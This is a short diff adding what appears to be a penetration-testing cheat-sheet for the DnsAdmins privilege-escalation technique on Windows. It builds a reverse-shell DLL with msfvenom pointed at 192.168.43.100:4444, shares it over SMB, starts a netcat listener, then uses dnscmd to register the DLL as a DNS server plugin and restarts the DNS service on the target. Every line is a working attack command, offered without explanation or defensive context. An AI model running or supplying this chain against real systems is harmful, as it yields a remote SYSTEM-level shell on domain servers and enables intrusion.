@@ -1,0 +1,10 @@
+#Kali
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f dll > privesc.dll
+sudo python smbserver.py <shareName> <path/of/share>
+nc -lnvp 4444
+
+
+#RHOST
+dnscmd testmachine.test.local /config /serverlevelplugindll \\192.168.43.100\share\privesc.dll
+sc.exe testmachine.test.local stop dns
+sc.exe testmachine.test.local start dns
